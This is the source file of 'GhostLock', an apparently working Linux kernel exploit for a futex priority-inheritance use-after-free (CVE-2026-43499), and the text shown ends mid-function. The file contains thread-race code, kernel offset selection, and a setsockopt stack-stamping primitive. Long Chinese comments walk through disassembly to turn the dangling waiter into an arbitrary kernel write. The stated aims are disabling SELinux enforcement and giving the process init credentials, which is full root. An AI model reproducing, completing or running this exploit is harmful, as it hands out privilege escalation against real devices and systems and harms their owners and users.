/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
 */

#include "common.h"
#include "runtime_offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>

const struct kernel_offsets *active_offsets = NULL;

int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int owner_chain_released;

/* stamp 结果（QUIET 模式下不写日志，等安全后再取） */
static long stamp_last_ret;
static long stamp_last_errno;
static int  stamp_quiet;
/* ===== 观测点（重建113）=====
 * 目的：证明 stamp_do() 是否真的执行、setsockopt 返回值/errno 是什么。
 * 铁律教训第1条：做任何字段级二分前，必须先验证"变量确实生效"。
 * 之前 stamp_quiet=1 时完全不记录，导致崩溃后无法区分
 *   (a) stamp_fd<0，stamp_do 直接 return（stamp 从未发生）
 *   (b) setsockopt 真的执行了，但踩坏了 waiter->lock
 * 约束：A 线程 stamp 之后【绝不允许任何 syscall】（会复用内核栈覆盖 rt_waiter），
 *       所以这里只能用原子变量（纯用户态 store），由 main 线程在 PI walk 结束后写盘。 */
atomic_long stamp_obs_fd;        /* stamp_do 执行时看到的 stamp_fd（-1 表示未创建） */
atomic_long stamp_obs_ret;       /* setsockopt 返回值 */
atomic_long stamp_obs_errno;     /* setsockopt errno */
atomic_long stamp_obs_enter;     /* 进入 stamp_do 计数（1=真的进来了） */
atomic_long stamp_obs_done;      /* 完成 stamp_do 计数 */
atomic_int  stamp_obs_optlen;    /* 实际传给 setsockopt 的 optlen */
atomic_int  stamp_obs_off;       /* 实际使用的 STAMP_WAITER_OFF */
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int consumer_disabled;
atomic_int fire_from_main;
int memfd_leak;
atomic_int parker_ready;
atomic_int parker_done;
static int read_task_prio(int tid);
static void stamp_do(void);
static void stamp_fd_prepare(void);
static void stamp_buf_init(uintptr_t target, long value);
static uintptr_t stamp_target_addr(void);
/* DIAG=8 专用：显式指定 policy + nice，保证能通过 core.c:5520 的 early return。
 * 必须使 policy != p->policy 或 nice != task_nice(p)，否则 __sched_setscheduler 直接 return 0，
 * 永远走不到 5628 的 rt_mutex_adjust_pi(p)。 */
static long sched_setattr_policy(int tid, unsigned int policy, int nice_value);
void *parker_thread(void *arg);
void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  ckpt_begin("waiter_lock_pi_chain");
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  ckpt_end("waiter_lock_pi_chain");
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  /* 实测本线程即将阻塞时的 prio：task_blocks_on_rt_mutex 会用
   * waiter->prio = task->prio 写入栈上 rt_waiter，这是栈上 prio 的
   * 真实来源（不受 boost 之后的 setattr 影响）。 */
  { int pb=read_task_prio(tid); ckpt_val("prio_at_block",(long)pb);
    pr_info("waiter: prio at block -> %d\n", pb); }
  int diag = env_int_range("DIAG", 0, 0, 9);
  errno = 0;
  ckpt_begin("waiter_wait_requeue_pi");
  long futex_ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int futex_errno = errno;
  /* DIAG=7 requires ZERO syscalls after futex return.
   * ckpt_end() itself does gettid+write+fsync (3 syscalls) => must skip it. */
  /* ===== A73 修复（2026-10-25）：DIAG=8/9 必须跳过 ckpt_end =====
   * [根因] ckpt_write_line 内含 clock_gettime + syscall(SYS_gettid) + write + fsync
   *   共 4 个 syscall。它们在本线程同一内核栈顶 T 上重建 4 次帧，
   *   把 futex_wait_requeue_pi 留下的 rt_waiter (T-0x170) 整块覆盖。
   *   于是 stamp_do 写入的区域已不是 waiter ⇒ 四轮 STAMP_OFF 均无法自洽解释。
   * [修复] DIAG=8/9 跳过 ckpt_end，使 stamp_do 的 setsockopt 成为
   *   futex 返回后的【第一个且唯一一个】syscall。 */
  if (diag != 7 && diag != 8 && diag != 9) ckpt_end("waiter_wait_requeue_pi");

  if (diag == 1) {
    /* DIAG=1: Cross-thread PI walk, waiter idle (no syscalls after futex).
     * The consumer calls sched_setattr from its OWN kernel stack.
     * The waiter's kernel stack is idle — freed waiter data should be intact.
     * NO pr_info/usleep here to avoid clobbering the waiter's kernel stack.
     * Wait on punch_consume_go (set to 0 by consumer AFTER sched_setattr returns),
     * NOT consumer_calls (set BEFORE sched_setattr — would race). */
    if (!atomic_load(&fire_from_main)) {
      /* original (late) trigger: waiter returns from futex FIRST, then consumer
       * fires — the PI walk then runs against an already-released waiter (UAF). */
      atomic_store(&punch_consume_go, 1);
      while (atomic_load(&punch_consume_go) != 0)
        __asm__ volatile("yield" ::: "memory");
    } else {
      /* main-triggered (early) variant: main thread fires the consumer while the
       * waiter is STILL blocked in FUTEX_WAIT_REQUEUE_PI. Waiter stays in the
       * syscall (no userspace activity) so its kernel stack stays pristine. */
      ckpt_begin("d1_wait_consumer_done");
      while (!atomic_load(&consumer_calls))
        __asm__ volatile("yield" ::: "memory");
      ckpt_end("d1_wait_consumer_done");
    }
    /* Consumer finished sched_setattr. Safe to use kernel stack now. */
    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    pr_info("DIAG=1: futex ret=%ld errno=%d\n", futex_ret, futex_errno);
    pr_info("DIAG=1: consumer calls=%d success=%d\n", calls, success);
    pr_info("DIAG=1: PASSED — cross-thread PI walk survived\n");
    atomic_store(&route_done, 1);
    ckpt_begin("d1_cleanup_unlock_chain");
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    ckpt_end("d1_cleanup_unlock_chain");
    ckpt_begin("d1_cleanup_wait_owner");
    while (!atomic_load(&owner_chain_done)) usleep(1000);
    ckpt_end("d1_cleanup_wait_owner");
    return NULL;
  }

  if (diag == 2) {
    /* DIAG=2: Cross-thread PI walk, waiter idle, WITH userspace activity
     * between futex return and PI walk (pr_info = write syscall).
     * Tests if intermediate syscalls clobber the freed waiter. */
    pr_info("DIAG=2: futex ret=%ld errno=%d, doing userspace activity...\n",
            futex_ret, futex_errno);
    pr_info("DIAG=2: now signaling consumer for cross-thread PI walk\n");
    atomic_store(&punch_consume_go, 1);
    while (atomic_load(&punch_consume_go) != 0)
      __asm__ volatile("yield" ::: "memory");
    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    pr_info("DIAG=2: consumer calls=%d success=%d\n", calls, success);
    pr_info("DIAG=2: PASSED\n");
    atomic_store(&route_done, 1);
    ckpt_begin("d2_cleanup_unlock_chain");
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    ckpt_end("d2_cleanup_unlock_chain");
    ckpt_begin("d2_cleanup_wait_owner");
    while (!atomic_load(&owner_chain_done)) usleep(1000);
    ckpt_end("d2_cleanup_wait_owner");
    return NULL;
  }

  if (diag == 7) {
    /* DIAG=7: ZERO-SYSCALL baseline after futex return.
     * Purpose: test whether ckpt_end()'s syscalls (gettid/write/fsync) clobber
     * the waiter thread's kernel stack and thereby destroy rt_waiter.
     * ckpt_end("waiter_wait_requeue_pi") is SKIPPED for DIAG=7 (see above),
     * so between futex return and consumer trigger there are ZERO syscalls.
     * We deliberately use ONLY user-space ops here (atomic_load / yield). */
    {
      /* Trigger consumer with user-space atomic store ONLY (no syscall). */
      atomic_store(&punch_consume_go, 1);
      unsigned long spins = 0;
      while (!atomic_load(&consumer_calls)) {
        __asm__ volatile("yield" ::: "memory");
        if (++spins > 2000000000UL) break;   /* safety bail-out */
      }
      /* write result via ckpt only AFTER consumer finished (stack already reused) */
      ckpt_val("d7_consumer_calls", (long)atomic_load(&consumer_calls));
      ckpt_val("d7_consumer_success", (long)atomic_load(&consumer_success));
      ckpt_val("d7_spins", (long)(spins > 1000000UL ? 1000000UL : spins));
      ckpt_val("d7_futex_ret", (long)futex_ret);
      ckpt_val("d7_futex_errno", (long)futex_errno);
    }
    atomic_store(&route_done, 1);
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
  }

  if (diag == 8 || diag == 9) {
    /* DIAG=8: setsockopt stamp，必须在 futex 返回后【第一个且唯一一个】syscall。
     * 原语（重建106）：optname=42 只拷 0x88 字节 =>
     *   只覆盖 waiter+0x00..0x17（rb 三字），lock(+0x38)/task(+0x30)/prio(+0x40) 保持内核真实值。
     * ===== 重建108 修正（关键）=====
     * 本线程从 futex 返回后，其内核栈顶仍是 S；任何后续 syscall 都会从
     * 同一个 S 重新建帧，SyS_futex/do_futex 会把 rt_waiter 重新放回 S-0x190，
     * 从而【整块覆盖】刚 stamp 好的区域。
     * 因此：stamp 之后本线程【不得再有任何 syscall】——不打日志、不解锁、不退出。
     * 需要 UNLOCK_PI 的收尾交给 main 线程（它有自己的栈 S'main，互不干扰）。
     * 本线程此后只做纯用户态 spin，直到被 kill 或超时。 */
    stamp_quiet = env_flag("STAMP_QUIET", 1);
    /* STAMP_SKIP=1：对照组，不 stamp。用于区分
     *   (a) 崩因是 stamp 生效后 PI walk 解引用悬空 waiter
     *   (b) 崩因是 A 自己的 futex 收尾就已经把 rt_waiter 写脏（与本利用无关）
     * 若 STAMP_SKIP=1 也崩在同一处，则 (b) 成立，stamp 无效；
     * 若不崩/崩点不同，则 (a) 成立。 */
    if (!env_flag("STAMP_SKIP", 0))
      stamp_do();                   /* <= 唯一且最后一个 syscall on this stack */
    atomic_store(&punch_consume_go, 1);
    /* 纯用户态等待：绝不进入内核 */
    for (;;) {
      if (atomic_load(&consumer_success)) break;
      if (atomic_load(&punch_consume_stop)) break;
      __asm__ volatile("yield" ::: "memory");
    }
    /* 到这里说明 consumer 已返回（或 stop）。此时 PI walk 已完成，
     * 才允许重新使用内核栈打日志。 */
    stamp_quiet = 0;
    ckpt_val("d8_stamp_ret", stamp_last_ret);
    ckpt_val("d8_stamp_errno", stamp_last_errno);
    ckpt_val("d8_consumer_success", (long)atomic_load(&consumer_success));
    atomic_store(&route_done, 1);
    for (;;) pause();               /* 不 exit：exit 也是 syscall，且会释放栈 */
  }
  /* DIAG=3 or higher: fall through to normal exploit path (do_pselect_fake_lock_route).
   * Use PSELECT_SHIFT=N to test specific shift values. */
  if (sendmsg_route_selected()) {
    do_sendmsg_fake_lock_route();
  } else if (mcast_route_selected()) {
    do_mcast_fake_lock_route();
  } else {
    do_pselect_fake_lock_route();
  }
  atomic_store(&route_done, 1);
  ckpt_begin("waiter_cleanup_unlock_chain");
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  ckpt_end("waiter_cleanup_unlock_chain");
  ckpt_begin("waiter_cleanup_wait_owner");
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  ckpt_end("waiter_cleanup_wait_owner");
  return NULL;
}


/* ===== DIAG=8 stamp 原语（重建113 复核后定案）=====
 * 使用 optname = MCAST_JOIN_GROUP(42)，进入 do_ip_setsockopt 的 {42,45} 分支：
 *   0x8f1c20c: cmp w23,#0x88 ; b.cc -> optlen 必须 >= 0x88
 *   0x8f1c268: add x0, sp, #0x20
 *   0x8f1c26c: mov w2, #0x88          <- 拷贝长度【固定】0x88
 *   0x8f1c270: bl  __arch_copy_from_user
 * => 写 buf[0x00..0x87]。
 *
 * 【几何复核（重建113，逐帧反汇编重新确认）】
 * 注意 objdump 对 STP 的 imm7 按十进制打印，对 SUB/ADD 立即数按十六进制打印：
 *   SyS_futex         sub sp,sp,#0x70            sp = T-0x70
 *                     add x29,sp,#0x20           x29 = T-0x50
 *   do_futex          stp x29,x30,[sp,#-96]!     -96(dec)=0x60, sp = (T-0x70)-0x60 = T-0xD0
 *                     mov x29,sp                 x29 = T-0xD0
 *                     sub x0,x29,#0xc0           rt_waiter = T-0x190
 *   SyS_setsockopt    stp x29,x30,[sp,#-80]!     -80(dec)=0x50, sp = T-0x50
 *                     0x8e65acc cmp w25,#0x1 ; b.ne -> level=0 != 1
 *                     0x8e65b0c blr x8           => 直推 sk_prot->setsockopt，
 *                                                  【跳过 sock_setsockopt 的 0x80 帧】
 *   udp_setsockopt    stp x29,x30,[sp,#-16]!     sp = T-0x60
 *                     optname=42 非 0x88/0x11 => bl ip_setsockopt
 *   ip_setsockopt     stp x29,x30,[sp,#-48]!     sp = T-0x90
 *   do_ip_setsockopt  sub sp,sp,#0x190           sp = T-0x220（全函数仅此一次，0x8f1bf80 恢复）
 *                     add x0,sp,#0x20            buf = T-0x200
 *   => off = 0x200 - 0x190 = 0x70
 *
 * 【覆盖范围】0x88 = 136 字节 => buf[0x00..0x87] = rt_waiter+0x00..0x17
 *   正好是 struct rb_node tree_entry 三个字，不碰 task(+0x30)/lock(+0x38)/prio(+0x40)。
 *   （struct rt_mutex_waiter 布局：tree_entry@0x00, pi_tree_entry@0x18, task@0x30,
 *     lock@0x38, prio@0x40, deadline@0x48；由 rt_mutex_init_waiter 反汇编
 *     + adjust_prio_chain 的 [x25,#56]/[x25,#64]/[x25,#72] 交叉验证）
 *
 * 【退出路径】buf[0x08] 保持 0（!= AF_INET）=> 0x8f1c280 b.ne 0x8f1c910
 *   => release_sock + 返回 -EINVAL。buf[0x08] = T-0x1F8，在 rt_waiter 之下，安全。
 *
 * 原语结果：buf[0x70]=V(pc)、buf[0x78]=0(rb_right)、buf[0x80]=T(rb_left)
 *    => __rb_erase_augmented 走 !child 分支 => *(T) = V，parent = V&~3 = 0（V∈0..3）
 */
/* ===== 重建121（gK28）：改用 optname=46 (MCAST_JOIN_SOURCE_GROUP) / optlen=0x108 =====
 * 目的：覆盖到 buf[0xA8] = rt_waiter+0x38 = waiter->lock，把它改成伪锁地址。
 *
 * 【0x108 分支反汇编核实 [反汇编]】
 *   optname {43,44,46,47} -> 0x8f1c0a0: cmp w23,#0x108 ; b.cc 退出（optlen>=0x108）
 *                                       -> __arch_copy_from_user(buf, optval, 0x108)
 *   校验1: 0x8f1c10c  ldrh w8,[sp,#40]   -> buf[0x08] 必须 == 2 (AF_INET)
 *   校验2: 0x8f1c118  ldrh w8,[sp,#168]  -> sp+0xA8 => buf[0x88] 必须 == 2
 *   lock 在 buf[0xA8]，不受这两个校验约束。
 *
 * 【栈几何不变】buf 仍 = T-0x200，rt_waiter = T-0x190 => off = 0x70。
 *   字段映射（buf 内偏移）：
 *     pc   0x70  (rt_waiter+0x00)
 *     right0x78  (rt_waiter+0x08)  = 0
 *     left 0x80  (rt_waiter+0x10)  = T (写目标)
 *     task 0xA0  (rt_waiter+0x30)  不读，任意
 *     lock 0xA8  (rt_waiter+0x38)  = FAKE_LOCK ★核心
 *     prio 0xB0  (rt_waiter+0x40)  必须 != task->prio
 *     dl   0xB8  (rt_waiter+0x48)  任意
 *   另需 buf[0x08] = 2、buf[0x88] = 2（两个 family 校验）。
 */
#define STAMP_BUF_LEN      0x108
/* =====★★★ 2026-10-22 重大纠错：waiter 在 buf 内偏移 = 0x80，不是 0x70 ★★★=====
 * 【错误根源】旧几何漏算了 sock_common_setsockopt 这一层（帧 0x10）。
 *   SyS_setsockopt 在 level != SOL_SOCKET(1) 时不走 sock_setsockopt，
 *   而是 ldr x8,[sock->ops + 0x68] ; blr x8  ← 0x68 = proto_ops.setsockopt
 *   （[反汇编] 0x8e65b00 ldr x8,[x8,#104]；CONFIG_COMPAT=y 时 setsockopt 正是 0x68）
 *   AF_INET 的 inet_dgram_ops.setsockopt = sock_common_setsockopt（[源码] af_inet.c）
 *
 * 【正确整链，A 级反汇编逐帧实测】S = SyS_setsockopt 入口 sp
 *   SyS_setsockopt          stp x29,x30,[sp,#-80]!   → S-0x50
 *   sock_common_setsockopt  stp x29,x30,[sp,#-16]!   → S-0x60   ★旧记录漏了这一层
 *   udp_setsockopt          stp x29,x30,[sp,#-16]!   → S-0x70
 *   ip_setsockopt           stp x29,x30,[sp,#-48]!   → S-0xa0
 *   do_ip_setsockopt        sub sp,sp,#0x190         → S-0x230
 *   copy_from_user dest = sp+0x20                    → buf = S-0x210
 *   futex 侧 rt_waiter = T-0x190（SyS_futex 0x70 + do_futex 0x1b0 + x29-0xc0）
 *   ⇒ waiter 在 buf 内偏移 = 0x210 - 0x190 = **0x80**
 *
 * 【这正是 gK57 崩 x24=0 的真因】按 0x70 写 buf 时（真实 waiter = buf+0x80）：
 *   buf[0x70]=pc        → 实际 waiter-0x10
 *   buf[0xA0]=task      → 实际 waiter+0x20 (pi_right)
 *   buf[0xA8]=fake_lock → 实际 waiter+0x28 (pi_left)   ← 写错位！
 *   buf[0xB8]=deadline=0→ 实际 waiter+0x38 = **lock = 0** ★
 *   ⇒ PI walk 读到 next_lock = waiter->lock = 0 ⇒ trylock(NULL) ⇒ 崩 +0x1c
 *   ⇒ 与实测（x24=0, x0=0, 崩 _raw_spin_trylock+0x1c）完全吻合。
 *
 * 【family 校验不再需要牺牲 rb_right】
 *   [反汇编] 0x8f1c104 bl __arch_copy_from_user 在 0x8f1c10c family 校验**之前**。
 *   故 family 不合法 → 返回 -EINVAL，但 **stamp 已生效**。
 *   所以 buf[0x88] 必须留给 rb_right = 0，绝不能填 family2=2。
 */
#define STAMP_FAMILY1_OFF  0x08   /* 绝对偏移，落在 waiter 区之外，安全 */
#ifndef STAMP_WAITER_OFF_DEFAULT
#define STAMP_WAITER_OFF_DEFAULT 0x80  /* A80: 0x90->0x80 回滚。机器码逐帧实测 buf=T-0x210, rt_waiter=T-0x190 => D=0x80；且 run9(STAMP_OFF=128,optlen=0x108,errno=99) 是唯一越过 trylock 的运行，实证 D=0x80 */
#endif
/* clamp：0x50 = waiter 全结构大小，保证 6 个字段都不越界 */
#define STAMP_WAITER_OFF   (env_int_range("STAMP_OFF", STAMP_WAITER_OFF_DEFAULT, 0, STAMP_BUF_LEN - 0x50))
/* 以下全部相对 waiter 基址 */
#define STAMP_PC_OFF       (STAMP_WAITER_OFF + 0x00)  /* = 0x80 */
#define STAMP_RIGHT_OFF    (STAMP_WAITER_OFF + 0x08)  /* = 0x88  必须 0 */
#define STAMP_LEFT_OFF     (STAMP_WAITER_OFF + 0x10)  /* = 0x90  = 写目标 T */
#define STAMP_TASK_OFF     (STAMP_WAITER_OFF + 0x30)  /* = 0xB0 */
#define STAMP_LOCK_OFF     (STAMP_WAITER_OFF + 0x38)  /* = 0xB8  ★核心 */
#define STAMP_PRIO_OFF     (STAMP_WAITER_OFF + 0x40)  /* = 0xC0 */
#define STAMP_DL_OFF       (STAMP_WAITER_OFF + 0x48)  /* = 0xC8 */

static int stamp_fd = -1;
/* gK100：keep_lock 模式标记（stamp_buf_init 设置，stamp_do 据此选 optname/optlen） */
static int stamp_keep_lock_mode = 0;
static unsigned char stamp_buf[STAMP_BUF_LEN] __attribute__((aligned(16)));

static void stamp_buf_init(uintptr_t target, long value) {
  memset(stamp_buf, 0, sizeof(stamp_buf));
  uint64_t *p = (uint64_t *)stamp_buf;
  /* STAMP_PROBE=1: 把 rb_left 设成必定 page-fault 的地址。
   * 若 PI walk 真走到 rb_erase_cached，就会执行 tmp->__rb_parent_color = pc，
   * 即 *(probe) = value => 必然崩。
   * 这是判断"是否进入 rb_erase"的唯一硬探针。 */
  /* ===== gK63 写原语形状重设计（A级源码推导）=====
   * [旧形状的问题] left=T, pc=0：
   *   rb_erase Case1 左子分支（tmp=T 非零、child=0）：
   *     *(T)=pc=0；parent=pc&~3=0；__rb_change_child(node,T,NULL,root)
   *     ⇒ **root->rb_node = T** ⇒ 随后 rt_mutex_enqueue 从 T 无界游走 ⇒ HWT 挂死。
   *
   * [新形状] left=0, right=0, pc=P（P = target-0x8，低2位=0）：
   *   rb_erase Case1 **无子**分支（tmp=0, child=0）：
   *     pc = node->__rb_parent_color = P；parent = __rb_parent(pc) = P；
   *     __rb_change_child(node, NULL, P, root)：
   *        若 P->rb_left != node ⇒ WRITE_ONCE(P->rb_right, NULL)
   *        ⇒ ***(P+0x8) = target = 0**  ← 写原语达成
   *     rebalance = __rb_is_black(P) ? P : NULL = NULL（bit0=0 即 RED）
   *        ⇒ 不做红黑修复，不会多写
   *     root->rb_node **不被修改** ⇒ enqueue 仍从 w1 开始 ⇒ 安全退出
   *
   * [为何 P 取 target-0x8] __rb_change_child 会写 P->rb_left(偏移0) 或 P->rb_right(偏移8)。
   *   要让写入落在 target，取 P = target - 0x8 ⇒ P->rb_right 位于 P+8 = target。
   *   前提：P->rb_left(P+0) != node。node 是内核栈上的悬空 waiter 地址，
   *   而 *(target-0x8) 是 selinux_state 前 8 字节（.bss，恒 0），两者相等的概率可忽略。
   *   若真巧合成立，会写 P+0 = target-0x8 而不是 target，不会崩，只是没生效。
   *   注意：target 必须 8 字节对齐，否则 P 低2位非 0，pc 会带上非法颜色位。
   */
  uintptr_t P = (uintptr_t)(target - 0x8);
  /* ===== gK85 修复（2026-10-23，A20 定案）：pc bit0 方向此前搞反了 =====
   * [B-源码] include/linux/rbtree_augmented.h:110-116
   *     #define RB_RED   0
   *     #define RB_BLACK 1
   *     #define __rb_color(pc)    ((pc) & 1)
   *     #define __rb_is_black(pc) __rb_color(pc)
   * 同文件 190 行：
   *     rebalance = __rb_is_black(pc) ? parent : NULL;
   *   ⇒ bit0=1 是 BLACK ⇒ rebalance = parent ⇒ 进 __rb_erase_color 重平衡
   *   ⇒ bit0=0 是 RED   ⇒ rebalance = NULL   ⇒ 不进重平衡
   *
   * [B-反汇编] rb_erase_cached @ 0xffffff80090d57c0，!tmp 分支 0x58ec：
   *   0x5904  str x9, [x8, #8]      ; 写原语 *(P+8) = 0（已达成）
   *   0x5908  cbz x9, 0x591c        ; child==0
   *   0x591c  tbz w10, #0, 0x5a44   ; ★pc bit0==0 ⇒ 直接 ret（干净返回）
   *   0x5924  mov x10, xzr          ; bit0==1 ⇒ 落入重平衡
   *   0x5934  ldrb w10, [x9]        ; 把 .data 内容当 rb_node 解引用 ⇒ 崩或挂死
   *
   * [旧 bug] pc_v = P | 1 ⇒ bit0=1 ⇒ BLACK ⇒ 进重平衡 ⇒ 本次实测 HWT 的直接原因。
   * [修复] pc_v = P & ~3UL ⇒ bit0=0 ⇒ RED ⇒ 0x591c tbz 直接 ret。
   */
  uintptr_t pc_v = (uintptr_t)(P & ~3UL);   /* 低2位=0 ⇒ RED ⇒ rebalance=NULL */
  if (env_flag("STAMP_LEGACY_SHAPE", 0)) {
    /* 对照组：旧形状（left=T, pc=0），用于复现 HWT */
    P = 0;
    pc_v = (uintptr_t)value;
  }
  uintptr_t left = (uintptr_t)env_ulong("STAMP_LEFT", 0);
  if (env_flag("STAMP_PROBE", 0))
    left = (uintptr_t)env_ulong("STAMP_PROBE_LEFT", 0xdead000000000000ULL);
  if (env_flag("STAMP_LEGACY_SHAPE", 0)) left = (uintptr_t)target;
  p[STAMP_PC_OFF / 8]    = (uint64_t)pc_v;    /* pc  : P|1 (新) / V (旧) */
  p[STAMP_RIGHT_OFF / 8] = 0;                 /* right: NULL  */
  p[STAMP_LEFT_OFF / 8]  = (uint64_t)left;    /* left : 0 (新) / T (旧) */

  /* ===== 重建121（gK28）核心：把 waiter->lock 指向伪锁 =====
   * 前提：optname=46 / optlen=0x108，才能拷到 buf[0xA8]。
   * 两个 family 校验必须满足，否则 do_ip_setsockopt 在 copy 之后
   * 走 0x8f1cde4 返回 -EINVAL（拷贝仍已生效，但为确定性起见一并填好）。
   */
  p[STAMP_FAMILY1_OFF / 8] = 2;               /* buf[0x08] = AF_INET */
  /* ★ 2026-10-22 纠错：绝不能写 buf[0x88]。
   * 新几何下 buf[0x88] = waiter+0x08 = rb_right，必须为 0。
   * family 校验发生在 copy_from_user 之后（[反汇编] 0x8f1c104 < 0x8f1c10c），
   * 所以 family2 不合法只会让 setsockopt 返回 -EINVAL，stamp 照样生效。 */

  /* 伪锁地址：FAKE_LOCK 环境变量优先（诊断用），否则用 heap spray 的全局 fake_lock。
   * ★ 诊断设计：把 FAKE_LOCK 设成一个「必定可读」的内核地址（如 selinux_enforcing，
   * 位于 .data）。若 stamp 真的改写了 waiter->lock：
   *     trylock 会成功 → 继续走到 rt_mutex_top_waiter 的 BUG_ON → 崩 +0x65c
   *   若 stamp 没生效（lock 仍是悬空原值）：
   *     仍崩在 _raw_spin_trylock+0x1c
   * 这样一次实验就能判定 stamp 是否真的写到了 waiter->lock。 */
  uintptr_t fl = (uintptr_t)env_ulong("FAKE_LOCK", 0);
  if (!fl) fl = fake_lock;
  /* ===== gK99 (A119)：STAMP_KEEP_LOCK —— 不改写 waiter->lock =====
   * [A119 反汇编铁证] rb_erase_cached:
   *   +0x18 cbz x8,+0x12c  => node->left==0 时走「无子」分支
   *   +0x12c ldr x10,[x0]           x10 = node->__rb_parent_color = pc
   *   +0x130 ands x8,x10,#~3        x8 = P (= target-0x8)，P!=0 不跳
   *   +0x144 str x9,[x8,#8]         *(P+8) = node->rb_right = 0  ★写原语
   *   +0x148 cbz x9,+0x15c          right==0 跳过
   *   +0x15c tbz w10,#0,+0x284      pc bit0==0(RED) => 直接 ret 干净退出
   * 全程只用 stamp 的 pc/left/right 三个字段，**不需要任何 payload 落页**。
   *
   * [历史为何从未走到] 旧 stamp 同时把 waiter->lock 改成 fake_lock：
   *   [5] raw_spin_trylock(&lock->wait_lock) 读 mm_struct 垃圾 -> 失败
   *   => goto retry 无限自旋 => HWT。stamp 改 lock 恰恰毁掉了唯一可行路径。
   *
   * [本模式] 保持 lock = 真实 &f_pi_target_mutex：
   *   [3] next_lock == waiter->lock ✓（同一字段）
   *   [5] trylock 真锁可成功（失败也只是 retry，非死锁）
   *   [6] rt_mutex_owner(真锁)=owner_thread != top_task=A ✓
   *   [7] rb_erase_cached -> left==0 -> +0x12c -> *(selinux_enforcing)=0 ★
   * prio=200 保证本 waiter 不成为 rb_leftmost => [11] 不进
   * dequeue_pi/enqueue_pi/adjust_prio => 本路径不需要 fake_task。
   */
  /* ===== gK100 (A120 修正)：keep_lock 必须配合 optname=42/optlen=0x88 =====
   * [A120 教训] gK99 只写了 prio、没写 lock，而 optlen=0x108 是整块拷贝，
   *   waiter->lock 被 memset 清成 0 => trylock(0) 页错误 => 签名与 FAKE_LOCK=1 相同。
   *   即 "保持真实锁" 从未被真正测试。
   *
   * [A-反汇编] do_ip_setsockopt 分支（vmlinux2.elf）：
   *   optname∈{43,44,46,47} -> +0x3e0  cmp w23,#0x108 ; copy 0x108  (全字段)
   *   optname∈{42,45}       -> +0x54c  cmp w23,#0x88  ; copy 0x88   ★只覆盖 waiter+0x00..0x07
   *   拷贝目标 buf=sp+0x20，waiter 在 buf+0x80 ⇒ 0x88 长度只写到 buf[0x87]
   *   ⇒ 只有 waiter+0x00 (__rb_parent_color = pc) 被改写，
   *     rb_right(+0x08)/rb_left(+0x10)/task/lock/prio/dl 全部保持内核真实值。
   *
   * [为何这样就够] rb_erase_cached 无子分支只用 pc/left/right：
   *   +0x18 cbz x8(left),+0x12c  ; 真实 waiter 是叶子 ⇒ left=0 ⇒ 进 +0x12c
   *   +0x12c ldr x10,[x0]        ; x10 = pc = P (=target-0x8)
   *   +0x130 ands x8,x10,#~3     ; P!=0 不跳
   *   +0x144 str x9,[x8,#8]      ; *(P+8) = right = 0  ⇒ selinux_enforcing=0 ★
   *   +0x15c tbz w10,#0,+0x284   ; P bit0=0 ⇒ 直接 ret 干净退出
   * lock 保持真实 &f_pi_target_mutex ⇒ [5] trylock 真锁、[11] BUG_ON(w->lock!=lock) 通过。
   */
  stamp_keep_lock_mode = env_flag("STAMP_KEEP_LOCK", 0);
  if (stamp_keep_lock_mode) {
    /* 只写 pc（已在上方按 pc_v = P&~3 写好）；其余字段一律不动 */
    ckpt_val("g100_keep_lock", 1);
  } else if (fl) {
    p[STAMP_LOCK_OFF / 8] = (uint64_t)fl;             /* waiter->lock = FAKE_LOCK ★ */
